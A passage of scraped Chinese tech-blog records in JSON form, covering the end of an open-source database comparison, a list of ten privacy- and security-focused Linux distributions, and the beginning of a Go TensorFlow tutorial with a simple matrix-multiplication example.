已经被下载了 2 亿次，并且有超过 1000 个合作伙伴支持。这些合作伙伴致力于这个免费的开源解决方案，他们相信编码与数据库应该是简单而自然的。</p>\n<h3>优点：</h3>\n<ul>\n<li>文件验证</li>\n<li>加密存储引擎</li>\n<li>常用用例：\n<ul>\n<li>移动应用</li>\n<li>产品目录</li>\n<li>内容管理</li>\n</ul>\n</li>\n<li>具有内存存储引擎（beta）的实时应用程序</li>\n<li>减少主要故障恢复的时间</li>\n</ul>\n<h3>缺点：</h3>\n<ul>\n<li>不适合需要处理复杂事务的应用程序</li>\n<li>不是传统应用程序的替代品</li>\n<li>年轻的解决方案：软件更新快</li>\n</ul>\n<h2><a href=\"https://www.mysql.com/\" target=\"_blank\" rel=\"nofollow\">MySQL</a></h2>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/06/f0f03562a6d03dee1357d51856d1f0b2.png\"></p>\n<p>MySQL 诞生于 1995 年前后，现在归 Oracle 拥有。 它是开源的，但也有几个付费版本提供其他功能，如异地备份和自动缩放。 因为MySQL是一个行业标准，所以它兼容每个操作系统，并由 C 和 C++ 编写。 该解决方案对于国际用户来说是一个很好的选择，因为服务器可以用多种语言向客户端发送错误消息，而且支持多种不同的字符集。</p>\n<h3>优点：</h3>\n<ul>\n<li>基于主机的验证</li>\n<li>即使没有网络也可用</li>\n<li>灵活的权限和密码系统</li>\n<li>所有密码的安全加密</li>\n<li>可以嵌入到独立应用程序中的库</li>\n<li>提供服务器作为客户端/服务器联网环境的独立程序</li>\n</ul>\n<h3>缺点：</h3>\n<ul>\n<li>被 Oracle 收购:\n<ul>\n<li>用户觉得 MySQL 不再属于免费和开源</li>\n<li>不再是社区驱动</li>\n<li>会员无法修复 bug 和补丁</li>\n<li>由于更新缓慢而落后于其他数据库</li>\n</ul>\n</li>\n</ul>\n<h2><a href=\"http://www.postgresql.org/\" target=\"_blank\" rel=\"nofollow\"><strong>PostgreSQL</strong></a></h2>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/06/4830898452775f5fa2ff2c7a2f212668.png\"></p>\n<p>PostgreSQL 拥有超过 15 年的积累，是另一个明星级开源选择，运行于所有主要的操作系统，包括Linux，UNIX（AIX，BSD，HP-UX，SGI IRIX，Mac OS X，Solaris，Tru64）和 Windows。 PostgreSQL 还完全符合 ACID 要素（原子性，一致性，隔离性，持久性）。</p>\n<h3>优点：</h3>\n<ul>\n<li>创建自定义数据类型和查询方法</li>\n<li>框架允许定义和创建自定义数据类型</li>\n</ul>\n<ul>\n<li>以十几种编程语言运行存储过程：\n<ul>\n<li>Java，Perl，Python，Ruby，Tcl，C / C ++及其自己的PL / pgSQL</li>\n</ul>\n</li>\n<li>GiST（广义搜索树）系统\n<ul>\n<li>B 树，B+树，R 树，部分和树，以及排名的 B+ 树</li>\n<li>提供不同的排序和搜索算法：</li>\n</ul>\n</li>\n</ul>\n<ul>\n<li>创建扩展如 CitusDB 更多的并行性，而不修改 Postgres 代码</li>\n</ul>\n<h3>缺点：</h3>\n<ul>\n<li>MVCC系统需要定期的“清理（vacuuming）”\n<ul>\n<li>高交易率环境中的问题</li>\n</ul>\n</li>\n<li>由强大的社区发展起来的\n<ul>\n<li>改进需要更大的努力</li>\n</ul>\n</li>\n</ul>\n<h2><a href=\"https://www.sqlite.org/\" target=\"_blank\" rel=\"nofollow\">SQLite</a></h2>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/06/44028eeefa561269f0e004267076fcc5.jpg\"></p>\n<p>SQLite 自称是世界上部署最广泛的数据库，2000年开始使用，已被诸如苹果，Facebook，微软和谷歌等知名公司使用。 每个版本均经过仔细测试来以确保可靠性。即使有错误，SQLite 的开发人员也会通过诚实地提供每个版本的错误列表和代码更改时间来告知其潜在的缺点。</p>\n<h3>优点：</h3>\n<ul>\n<li>没有单独的服务器进程</li>\n<li>文件格式是跨平台的</li>\n<li>紧凑型库：运行速度比更大内存的还要快</li>\n<li>符合 ACID 原则</li>\n<li>还可提供专业支持</li>\n</ul>\n<h3>缺点：</h3>\n<ul>\n<li>不推荐用于：\n<ul>\n<li>客户端/服务器应用程序</li>\n<li>大容量网站</li>\n<li>大数据集</li>\n<li>高并发性</li>\n</ul>\n</li>\n</ul>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"111379\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"111379votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"111379\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 4 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2017/06/2367a0bbaec8a0e361962dd3c6845afc.png"], "fav_nums": 4, "comment_nums": 0, "create_date": "2017/06/07", "praise_nums": 1}
{"tags": "工具与资源,Linux", "front_image_path": "full/afce380e67e6757fa681cdf46ce584920cb491a3.jpg", "title": "2017 十大最佳用于隐私和安全保护的 Linux 发行版", "url_object_id": "9ee795c61ba918ee74aef13fbaab16a9", "url": "http://blog.jobbole.com/111466/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"https://my.oschina.net/editorial-story/blog/920550\">开源中国 - 局长</a>   </div><p><img class=\"aligncenter\" src=\"https://static.oschina.net/uploads/space/2017/0613/195235_iFxM_2918182.jpg\" alt=\"\" width=\"650\" height=\"400\"></p>\n<h2 id=\"h2_0\"><strong>介绍</strong></h2>\n<p>优秀的 Linux 操作系统是自由和开源的。因此，有数千种不同的“风味”可供选择——而某些类型的 Linux，例如 Ubuntu 是通用的，而且适用于许多不同的用途。</p>\n<p>但安全意识高的用户会对专为隐私和安全设计的 Linux 发行版更有兴趣，它们可以帮助你通过加密操作来保护数据的安全，并支持在 Live 模式下运行，无需将数据写入在使用中的硬盘。</p>\n<p>这篇文章将列出十个关注隐私和安全性的 Linux 发行版。</p>\n<h2 id=\"h2_1\" style=\"text-align: left\"><strong>1. Qubes OS</strong></h2>\n<p><img class=\"aligncenter\" src=\"https://static.oschina.net/uploads/space/2017/0613/195433_DrFR_2918182.png\" alt=\"\" width=\"650\" height=\"365\"></p>\n<p>虽然不是面向新手用户的发行版，但 Qubes 是顶级的关注隐私的发行版之一。该发行版必须使用图形化安装程序将操作系统安装到硬盘驱动器，这是被加密的。</p>\n<p>Qubes OS 使用 Xen Hypervisor 来运行多个虚拟机，其主要理念就是基于隔离的安全，它会将系统隔离为“个人”、“工作”和“上网”。这样，即便你不小心在工作机器上下载了恶意软件，但个人文件不会受到影响。</p>\n<p>主桌面会使用颜色编码的窗口，用于展示不同的虚拟机，以方便区分。</p>\n<p>https://www.qubes-os.org/</p>\n<h2 id=\"h2_2\"><strong>2. Tails</strong></h2>\n<p><img src=\"https://static.oschina.net/uploads/space/2017/0613/195623_NeGI_2918182.png\" alt=\"\" width=\"650\" height=\"520\"></p>\n<p>Tails (The Amnesiac Incognito Live System) 可能是最有名的关注隐私的 Linux 发行版之一，它是基于 Debian 的自启动光盘和 USB 发行。Tails 可以在 Live 模式下从 DVD 运行，从而将其完全加载进系统 RAM，并且其活动不会产生任何痕迹。这款系统也可以像普遍的系统一样在“持久”模式下运行，关于系统的设置会存储在加密的 U 盘上。</p>\n<p>Tails 为用户提供了完整的因特网匿名功能，所有的网络流量都会经过匿名网络 Tor，它可隐藏你的上网痕迹，使得网络流量难以被追踪。Tails 中配备的应用程序也是经过谨慎选择的，以安全为理念进行了预配置，以增强用户的隐私安全。例如，KeePassX 密码管理器、网页浏览器、IRC客户端、邮件mail客户端等。值得注意的是 Tails 会不断发现漏洞，因此请务必经常检查更新。（当然对待任何操作系统都应如此）</p>\n<p>https://tails.boum.org/</p>\n<h2 id=\"h2_3\"><strong>3. BlackArch Linux</strong></h2>\n<p><img class=\"aligncenter\" src=\"https://static.oschina.net/uploads/space/2017/0613/195923_uICR_2918182.png\" alt=\"\" width=\"650\" height=\"520\"></p>\n<p>这个基于 Arch Linux 的轻量级渗透测试发行，包含了 1,600 多种不同的黑客工具以用于渗透测试和计算机取证分析，这节省了每次下载需要的时间。BlackArch Linux 被设计为服务于系统渗透测试人员及安全研究人员，包含有多个轻量级窗口管理器如 Fluxbox、Openbox、Awesome、spectrwm。</p>\n<p>BlackArch Linux的提供形式是一张自启动运行 DVD 镜像，可以从 U 盘或 CD 上直接运行，也可以安装到电脑或虚拟机，甚至可以安装在树莓派上以给你提供一个便携的渗透测试计算机。</p>\n<p>特别值得一提的是它的 ‘anti-forensics’ 目录，因为它包含了为已加密的设备扫描内存的工具，这有助于保护机器免受“冷启动攻击”。</p>\n<p>https://blackarch.org/</p>\n<h2 id=\"h2_4\"><strong>4. Kali</strong></h2>\n<p><img src=\"https://static.oschina.net/uploads/space/2017/0426/080144_KZXe_2720166.png\"></p>\n<p>Kali Linux（以前叫做BackTrack），以印度教的一个女神命名，是最著名的渗透测试发行版之一，也是一份基于 Debian 的发行。它带有一套安全和计算机取证工具。其特色在于及时的安全更新（每周提供更新的 ISO 镜像），对 ARM 架构的支持（可在树莓派上运行），有四种流行的桌面环境供选择，以及能平滑升级到新版本。</p>\n<p>Kali 有着令人敬畏的声望，它的创作者会通过 <a href=\"https://www.kali.org/kali-linux-dojo-workshop/\" target=\"_blank\" rel=\"nofollow\">Kali Linux Dojo</a> 提供培训。课程内容包括定制自己的 Kali Linux ISO 和学习渗透测试的基础。对于无法参加培训的人士，所有的课程教育资源都可通过 Kali 的网站免费获取。</p>\n<p>https://www.kali.org/</p>\n<h2 id=\"h2_5\"><strong>5. IprediaOS</strong></h2>\n<p><img src=\"https://static.oschina.net/uploads/space/2017/0613/200242_tDsT_2918182.jpg\" alt=\"\" width=\"650\" height=\"365\"></p>\n<p>IprediaOS 是一个基于 Linux 的快速、强大和稳定的操作系统，提供了匿名的环境。所有的网络流量都会被自动和透明地加密和匿名化。这个面向隐私的操作系统基于 Fedora Linux，可在 Live 模式下运行也可安装到硬盘上。正如 Tails OS 会将所有网络流量通过 Tor 网络以避免被追踪，Ipredia 中所有的网络流量都会经过匿名的 I2P 网络。</p>\n<p>它的功能包括匿名电子邮件和 BitTorrent 客户端，IRC 聊天，以及浏览 eepsites（特殊的 .i2p 扩展名）的功能。与 Tor 不同的是，I2P 不能作为访问正常的互联网的网关，所以 Ipredia 无法安全地访问常规网站。不过只能访问 eepsites 的优点是你的连接是真正无法被追溯的。</p>\n<p>http://www.ipredia.org/os</p>\n<h2 id=\"h2_6\"><strong>6. Whonix</strong></h2>\n<p><img src=\"https://static.oschina.net/uploads/space/2017/0613/200603_Z1TH_2918182.png\" alt=\"\" width=\"650\" height=\"520\"></p>\n<p>引导一份 Live 操作系统是一个麻烦，因为必须重新启动计算机，但将其安装到硬盘意味着有被攻击的风险。Whonix 提供了一个优雅的方案，它被设计为运行在 Virtualbox 中作为一个虚拟机而工作。由于它在虚拟机中运行，所以 Whonix 与所有可运行 Virtualbox 的操作系统兼容。</p>\n<p>Whonix 是一份聚焦于匿名性、隐私、安全的操作系统。它基于 Tor 匿名网络、Debian GNU/Linux、基于隔离的安全性。Whonix 包括两部分，一部分只运行在 Tor 上并扮演网关角色，这部分叫做 Whonix-Gateway；另一部分叫做 Whonix-Workstation，位于隔离网络中。只有经由 Tor 的连接被允许。有了 Whonix，你就可以匿名使用应用程序并在因特网上运行服务器。因匿名解析而造成的信息泄漏不可能存在，即便获得了根权限的恶意软件也无法发现用户的真实 IP 地址。</p>\n<p>https://www.whonix.org/</p>\n<h2 id=\"h2_7\"><strong>7. Discreete Linux</strong></h2>\n<p><img src=\"https://static.oschina.net/uploads/space/2017/0613/200511_1ovk_2918182.jpg\" alt=\"\" width=\"650\" height=\"365\"></p>\n<p>这个故意拼写错的发行版是优秀的 Ubuntu Privacy Remix 的继承者。该操作系统不支持网络硬件或内部硬盘驱动器，因此所有的数据都离线存储在 RAM 或 USB 设备中。它可以在 Live 模式下运行，但当从卷启动时也允许将一些设置存储在加密的‘Cryptobox’中。</p>\n<p>还有另外一个值得关注的功能是它的内核模块只能在 Discreete Linux 团队进行数字签名后才能安装。这可以防止黑客试图偷偷安装恶意软件。请注意，该操作系统目前尚处于 Beat 测试阶段。</p>\n<p>https://www.discreete-linux.org/</p>\n<h2 id=\"h2_8\"><strong>8. Parrot Security OS</strong></h2>\n<p><img src=\"http://static.oschina.net/uploads/space/2016/1017/071656_YYvN_2720166.png\"></p>\n<p>这款渗透测试系统由来自意大利的团队 Frozenbox 开发。和 Kali 和 BlackArch 一样，它也包含着许多易用的工具。Parrot Security OS 是面向安全的操作系统，它被设计为用于渗透测试、计算机取证、反向工程、攻击、云计算渗透测试、隐私/匿名、密码等场合。</p>\n<p>Parrot 基于 Debian，其特色在于 MATE 桌面环境，拥有更丰富多彩的背景和菜单。因此，它对硬件的要求比其他渗透测试发行版（例如 Kali）更高。建议至少使用 2GB 的 RAM。</p>\n<p>对于资源有限的用户，Parrot Cloud 是专门用于在服务器上运行的特殊发行版。它没有图形界面，但包含了一些网络和取证工具，可用于远程运行测试。</p>\n<p>https://www.parrotsec.org/</p>\n<h2 id=\"h2_9\"><strong>9. Subgraph OS</strong></h2>\n<p><img src=\"https://static.oschina.net/uploads/space/2017/0613/201019_7SbG_2918182.png\" alt=\"\" width=\"650\" height=\"365\"></p>\n<p>Subgraph OS 是基于 Debian 的 Linux 发行，为超强的安全性而设计，它提供了多种安全、匿名上网、加固的特性。它的内核通过许多安全性的增强进行了加固，Subgraph 还在诸如浏览器之类的高风险应用中创建了虚拟的“沙盒”。因此，任何针对独立应用程序的攻击都不会危及整个系统。</p>\n<p>Subgraph OS 使用加固过的 Linux 内核及应用防火墙来阻止特定的可执行程序去访问网络，并强制要求所有的因特网流量都经由 Tor 网络。每个应用程序需要连接到网络和访问其他应用程序的“沙盒”都需经过手动的允许。</p>\n<p>该发行的文件管理器带有特色工具可以从数据文件中移除元数据，并且还集成了 OnionShare 文件共享软件。该发行使用 Icedove 邮件客户端以自动配合 Enigmail 对电子邮件进行加密。</p>\n<p>在 Subgraph 中，对文件系统的加密是强制性的，这意味着没有写入未加密数据的危险。要注意的是，Subgraph 还处于测试阶段，因此不要依赖使用它来保护任何真正敏感的数据（并且一如既往地保持常规的备份）。</p>\n<p>https://subgraph.com/</p>\n<h2 id=\"h2_10\"><strong>10. TENS</strong></h2>\n<p><img src=\"https://static.oschina.net/uploads/space/2017/0613/194931_D4L5_2720166.png\"></p>\n<p>第十个发行版恰好是 TENS(Trusted End Node Security)。以前被称为 LPS(Lightweight Portable Security)，这份 Linux 发行版是美国国防部的产品。Trusted End Node Security (TENS)是基于 Linux 的自启动运行光盘，其目标是让用户能在计算机上工作而不会有向恶意软件、键盘记录程序及其他因特网时代的恶疾泄露信息凭证及私人数据的风险。</p>\n<p>它包含了最必需的一套应用软件及实用工具，例如 Firefox 网页浏览器，以及一份加密向导以对个人文件进行加解密。但有一个‘Public Deluxe’（公开豪华版）也包含了 Adobe Reader 和 LibreOffice 这样的工具。所有的版本都包含一个自定义防火墙，值得注意的是该操作系统支持通过 Smart Card 登录。</p>\n<p>https://spi.dod.mil/lipose.htm</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"111466\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"111466votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"111466\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 2 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["https://static.oschina.net/uploads/space/2017/0613/195235_iFxM_2918182.jpg"], "fav_nums": 2, "comment_nums": 0, "create_date": "2017/06/15", "praise_nums": 1}
{"tags": "Go,开发,TensorFlow", "front_image_path": "full/5c3e802fa7c46fa53f8411355279d527314c20be.jpg", "title": "使用 Go 语言来理解 Tensorflow", "url_object_id": "d30f567903f1e7312bf578c3ca0c3935", "url": "http://blog.jobbole.com/111491/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://pgaleone.eu/tensorflow/go/2017/05/29/understanding-tensorflow-using-go/\">P. Galeone</a>   译文出处：<a target=\"_blank\" href=\"http://www.iteye.com/news/32467\">雁惊寒</a>   </div><p><em>译者注：本文通过一个简单的Go绑定实例，让读者一步一步地学习到Tensorflow有关ID、作用域、类型等方面的知识。以下是译文。</em></p>\n<p>Tensorflow并不是机器学习方面专用的库，而是一个使用图来表示计算的通用计算库。它的核心是用C++实现的，并且还有不同语言的绑定。Go语言绑定是一个非常有用的工具，它与Python绑定不同，用户不仅可以通过Go语言使用Tensorflow，还可以了解Tensorflow的底层实现。</p>\n<p><strong>绑定</strong></p>\n<p>Tensorflow的开发者正式发布了：</p>\n<ul>\n<li>C++源代码：真正的Tensorflow核心，实现了具体的高级和低级操作。</li>\n<li>Python绑定和Python库：这个绑定是由C++实现自动生成的，这样我们可以使用Python来调用C++函数。此外，这个库将调用融合到了绑定中，以便定义更高级别的API。</li>\n<li>Java绑定。</li>\n<li>Go绑定。</li>\n</ul>\n<p>作为一个Go开发者而不是一个Java爱好者，我开始关注Go绑定，以便了解他们创建了什么样的任务。</p>\n<p><strong>Go绑定</strong></p>\n<div><img class=\"aligncenter\" src=\"http://dl2.iteye.com/upload/attachment/0125/3210/5d4bd576-2c19-330c-aee5-8eb9da01eb3e.png\"></div>\n<div style=\"text-align: center\">地鼠与Tensorflow的徽标</div>\n<p>首先要注意的是，Go API缺少对Variable的支持：该API旨在使用已经训练过的模型，而不是从头开始训练模型。安装Tensorflow for Go的时候已经明确说明了：</p>\n<blockquote><p>TensorFlow提供了可用于Go程序的API。这些API特别适合于加载用Python创建并需要在Go程序中执行的模型。</p></blockquote>\n<p>如果我们对培训ML模型不感兴趣，万岁！相反，如果你对培训模型感兴趣，那就有一个建议：</p>\n<blockquote><p>作为一个真正的Go开发者，保持简单！使用Python定义并训练模型；你可以随时使用Go来加载并使用训练过的模型！</p></blockquote>\n<p>简而言之，go绑定可用于<strong>导入和定义</strong>常量图；在这种情况下，常量指的是没有经过训练的过程，因此没有可训练的变量。</p>\n<p>现在，开始用Go来深入学习Tensorflow吧：让我们来创建第一个应用程序。</p>\n<p>在下文中，我假设读者已经准备好Go环境，并按照<a href=\"https://github.com/tensorflow/tensorflow/blob/master/tensorflow/go/README.md\" target=\"_blank\">README</a>中的说明编译并安装了Tensorflow绑定。</p>\n<p><strong>理解Tensorflow结构</strong></p>\n<p>让我们来重复一下什么是Tensorflow：</p>\n<blockquote><p>TensorFlow™是一款使用数据流图进行数值计算的开源软件库。图中的节点表示数学运算，而图的边表示在节点之间传递的多维数据数组（张量）。</p></blockquote>\n<p>我们可以把Tensorflow视为一种描述性语言，这有点像SQL，你可以在其中描述你想要的内容，并让底层引擎（数据库）解析你的查询、检查句法和语义错误、将其转换为内部表示形式、进行优化并计算出结果：所有这一切都会给你正确的结果。</p>\n<p>因此，当我们使用任何一个API时，我们真正做的是描述一个图：当我们把图放到Session中并显式地在Session中运行图时，图的计算就开始了。</p>\n<p>知道了这一点之后，让我们试着来定义一个计算图并在一个Session中进行计算吧。<a href=\"https://godoc.org/github.com/tensorflow/tensorflow/tensorflow/go\" target=\"_blank\">API文档</a>为我们提供了tensorflow（简写为 tf）和op包中所有方法的列表。</p>\n<p>我们可以看到，这两个包包含了我们需要定义和计算图形的所有内容。</p>\n<p>前者包含了构建一个基本的“空”结构（就像Graph本身）的功能，后者是包含由C++实现自动生成绑定的最重要的包。</p>\n<p>然而，假设我们要计算A与x的矩阵乘法，其中</p>\n<div><img class=\"aligncenter\" src=\"http://dl2.iteye.com/upload/attachment/0125/3212/b2aca1f7-5bfc-3c34-a4a3-6e1e640db759.png\"></div>\n<p>我假设读者已经熟悉了tensorflow图定义的基本思想，并且知道占位符是什么以及它们如何工作。下面的代码是对Tensorflow Python绑定的第一次尝试。我们来调用这个文件attempt1.go</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b6cd4a4754939363350\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\npackage main  \r\n  \r\nimport (  \r\n    \"fmt\"  \r\n    tf \"github.com/tensorflow/tensorflow/tensorflow/go\"  \r\n    \"github.com/tensorflow/tensorflow/tensorflow/go/op\"  \r\n)  \r\n  \r\nfunc main() {  \r\n    // 这里，我们打算要: 创建图  \r\n  \r\n    // 我们要定义两个占位符用于在运行的时候传入  \r\n    // 第一个占位符 A 将是一个 [2, 2] 的整数张量  \r\n    // 第二个占位符 x 将是一个 [2, 1] 的整数张量  \r\n  \r\n    // 然后，我们要计算 Y = Ax  \r\n  \r\n    // 创建图的第一个节点： 一个空的节点，位于图的根  \r\n    root := op.NewScope()  \r\n  \r\n    // 定义两个占位符  \r\n    A := op.Placeholder(root, tf.Int64, op.PlaceholderShape(tf.MakeShape(2, 2)))  \r\n    x := op.Placeholder(root, tf.Int64, op.PlaceholderShape(tf.MakeShape(2, 1)))  \r\n  \r\n    // 定义接收A和x作为输入参数的操作节点  \r\n    product := op.MatMul(root, A, x)  \r\n  \r\n    // 每次我们把一个`Scope`穿给操作符的时候，把操作放在作用域的下面。  \r\n    // 这样，我们有了一个空的作用域（由NewScope创建）：空的作用域是图的根，因此可以用“/”来表示。  \r\n  \r\n    // 现在，我们让tensorflow按照我们的定义来创建图。  \r\n    // 把作用域和OP结合起来，创建具体的图。  \r\n  \r\n    graph, err := root.Finalize()  \r\n    if err != nil {  \r\n        // 这里没办法处理这个错误：  \r\n        // 如果我们错误的定义了图，我们必须手工修改这个定义。  \r\n  \r\n        // 这就跟SQL查询一样：如果查询语句在语法上有问题，我们只能重新写  \r\n        panic(err.Error())  \r\n    }  \r\n  \r\n    // 如果在这里，图在语法上是正确的。  \r\n    // 我们就可以把它放到一个Session里，并执行。  \r\n  \r\n    var sess *tf.Session  \r\n    sess, err = tf.NewSession(graph, &amp;tf.SessionOptions{})  \r\n    if err != nil {  \r\n        panic(err.Error())  \r\n    }  \r\n  \r\n    // 要使用占位符，我们必须创建一个Tensors，这个Tensors包含要反馈到网络的数值  \r\n    var matrix, column *tf.Tensor  \r\n  \r\n    // A = [ [1, 2], [-1, -2] ]  \r\n    if matrix, err = tf.NewTensor([2][2]int64{ {1, 2}, {-1, -2} }); err != nil {  \r\n        panic(err.Error())  \r\n    }  \r\n    // x = [ [10], [100] ]  \r\n    if column, err = tf.NewTensor([2][1]int64{ {10}, {100} }); err != nil {  \r\n        panic(err.Error())  \r\n    }  \r\n  \r\n    var results []*tf.Tensor  \r\n    if results, err = sess.Run(map[tf.Output]*tf.Tensor{  \r\n        A: matrix,  \r\n        x: column,  \r\n    }, []tf.Output{product}, nil); err != nil {  \r\n        panic(err.Error())  \r\n    }  \r\n    for _, result := range results {  \r\n        fmt.Println(result.Value().([][]int64))  \r\n    }  \r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b6cd4a4754939363350-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b6cd4a4754939363350-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594b6cd4a4754939363350-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b6cd4a4754939363350-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594b6cd4a4754939363350-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b6cd4a4754939363350-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-594b6cd4a4754939363350-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b6cd4a4754939363350-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-594b6cd4a4754939363350-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b6cd4a4754939363350-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-594b6cd4a4754939363350-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b6cd4a4754939363350-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-594b6cd4a4754939363350-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b6cd4a4754939363350-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-594b6cd4a4754939363350-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b6cd4a4754939363350-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-594b6cd4a4754939363350-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b6cd4a4754939363350-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-594b6cd4a4754939363350-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b6cd4a4754939363350-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-594b6cd4a4754939363350-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b6cd4a4754939363350-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-594b6cd4a4754939363350-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b6cd4a4754939363350-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-594b6cd4a4754939363350-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b6cd4a4754939363350-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-594b6cd4a4754939363350-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b6cd4a4754939363350-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-594b6cd4a4754939363350-29\">29</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b6cd4a4754939363350-30\">30</div><div class=\"crayon-num\" data-line=\"crayon-594b6cd4a4754939363350-31\">31</div><div class=\"crayon-num crayon-striped-num\" 